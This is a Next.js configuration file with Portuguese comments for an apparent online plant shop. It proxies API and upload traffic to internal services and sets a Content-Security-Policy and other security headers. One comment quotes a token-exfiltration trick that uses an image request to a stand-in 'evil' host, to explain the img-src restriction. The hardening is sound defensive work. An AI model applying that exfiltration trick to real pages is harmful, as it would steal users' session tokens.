import type { NextConfig } from 'next';

/**
 * O servidor do Next é a única porta aberta para a internet.
 *
 * O navegador fala só com este domínio. As chamadas para `/api/**` e as fotos em
 * `/uploads/**` são repassadas daqui para os serviços, pela rede interna. As
 * APIs não precisam estar publicadas, e uma porta exposta em vez de três é a
 * diferença mais barata de segurança que este projeto tem.
 *
 * Dois efeitos que vêm junto:
 *
 * - **A mesma imagem serve todos os ambientes.** O único endereço que ela
 *   conhece é o interno, que é o nome do serviço na rede do Docker e não muda
 *   entre dev, staging e produção. Antes, o endereço público ia embutido no
 *   JavaScript durante o build (é o que `NEXT_PUBLIC_*` faz), o que obrigaria a
 *   reconstruir por ambiente e faria a imagem testada em staging deixar de ser
 *   a que vai para produção.
 * - **CORS deixa de existir**, porque tudo vem da mesma origem.
 *
 * Sobre as fotos, há uma armadilha específica do Next 16: ele recusa otimizar
 * imagem cujo host resolve para IP privado, como proteção contra SSRF, e a
 * única pista fica no log do servidor:
 *
 *   upstream image ... hostname resolved to private IP ["::1","127.0.0.1"]
 *
 * Tanto `product-service` (rede do Docker) quanto `localhost` são privados,
 * então toda foto falhava com 400. Existe uma opção `dangerouslyAllowLocalIP`
 * para desligar a checagem: o nome é honesto e a resposta é não, porque ela
 * reabriria o buraco justamente onde a URL vem de dado do banco. Passando pelo
 * rewrite, a imagem é same-origin e quem busca do backend é o servidor do Next,
 * para um host fixo definido aqui.
 *
 * Uma armadilha vale registrar: o destino do rewrite é resolvido no **build**,
 * não em runtime. Mudar `PRODUCT_API` só no ambiente do container não tem
 * efeito; ele precisa ir como `ARG` no Dockerfile também.
 */
const PRODUTOS = process.env.PRODUCT_API ?? 'http://localhost:8081';
const AUTENTICACAO = process.env.AUTH_API ?? 'http://localhost:8080';

/**
 * Content-Security-Policy.
 *
 * Existe por causa de uma exposição concreta: o token da vendedora fica no
 * `sessionStorage`, ao alcance de qualquer JavaScript que consiga rodar na
 * página. A correção de fundo é cookie `HttpOnly`, que depende do backend
 * emitir o cookie; até lá, isto é o que limita o estrago.
 *
 * O que cada linha impede, em ordem de importância:
 *
 * - `connect-src 'self'`: mesmo que um script hostil rode, ele não consegue
 *   mandar o token para fora por `fetch`, `XHR` ou WebSocket;
 * - `img-src` sem host externo: fecha a saída por `new Image().src = 'evil/?t='`,
 *   que é como se contorna `connect-src`;
 * - `object-src 'none'` e `base-uri 'self'`: tiram plugin e sequestro de URL
 *   relativa da mesa;
 * - `frame-ancestors 'none'`: mesma proteção do `X-Frame-Options`, na forma que
 *   os navegadores atuais respeitam.
 *
 * **O limite conhecido**: `script-src` precisa de `'unsafe-inline'`. O Next
 * injeta na página os scripts embutidos que carregam o estado da hidratação, e
 * sem isso a loja não abre. Resolver de verdade exige nonce por requisição, o
 * que significa middleware em toda rota. Fica registrado como dívida, e não
 * como se estivesse resolvido: com `'unsafe-inline'`, a CSP não impede o script
 * hostil de rodar, ela impede o resultado dele de sair daqui.
 */
const POLITICA_DE_CONTEUDO = [
  "default-src 'self'",
  "script-src 'self' 'unsafe-inline'",
  // O Tailwind e o Next injetam estilo embutido; não há host externo envolvido.
  "style-src 'self' 'unsafe-inline'",
  // `blob:` é a prévia da foto antes de salvar, no painel; `data:` são os ícones
  // desenhados em linha.
  "img-src 'self' data: blob:",
  "font-src 'self'",
  "connect-src 'self'",
  "form-action 'self'",
  "frame-ancestors 'none'",
  "base-uri 'self'",
  "object-src 'none'",
].join('; ');

const nextConfig: NextConfig = {
  // O padrão manda `X-Powered-By: Next.js` em toda resposta. Não é uma falha por
  // si, mas entrega de graça qual pilha e qual versão procurar num boletim de
  // vulnerabilidade.
  poweredByHeader: false,

  images: {
    // Só imagens do próprio domínio, e só sob /uploads. O padrão local é mais
    // restritivo que o remoto por natureza: não há host de terceiro envolvido.
    localPatterns: [{ pathname: '/uploads/**', search: '' }],
  },

  async rewrites() {
    return [
      // O catálogo e o login, vistos do navegador. O prefixo /api não colide com
      // rota nenhuma: estes rewrites são avaliados depois do sistema de
      // arquivos, então um route handler futuro em app/api venceria.
      { source: '/api/product', destination: `${PRODUTOS}/v1/product` },
      { source: '/api/product/:caminho*', destination: `${PRODUTOS}/v1/product/:caminho*` },
      { source: '/api/auth/:caminho*', destination: `${AUTENTICACAO}/v1/auth/:caminho*` },

      // Os dados da loja: leitura pública, escrita só com token de ADMIN, o que
      // quem decide é o backend.
      { source: '/api/settings', destination: `${PRODUTOS}/v1/settings` },

      // As fotos das plantas.
      { source: '/uploads/:caminho*', destination: `${PRODUTOS}/uploads/:caminho*` },
    ];
  },

  // O container roda o build standalone: leva só o necessário para executar,
  // em vez de node_modules inteiro.
  output: 'standalone',

  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          { key: 'X-Content-Type-Options', value: 'nosniff' },
          { key: 'X-Frame-Options', value: 'DENY' },
          { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
          { key: 'Content-Security-Policy', value: POLITICA_DE_CONTEUDO },
          // Sem câmera, microfone nem localização em lugar nenhum da loja.
          { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=(), payment=()' },
        ],
      },
    ];
  },
};

export default nextConfig;
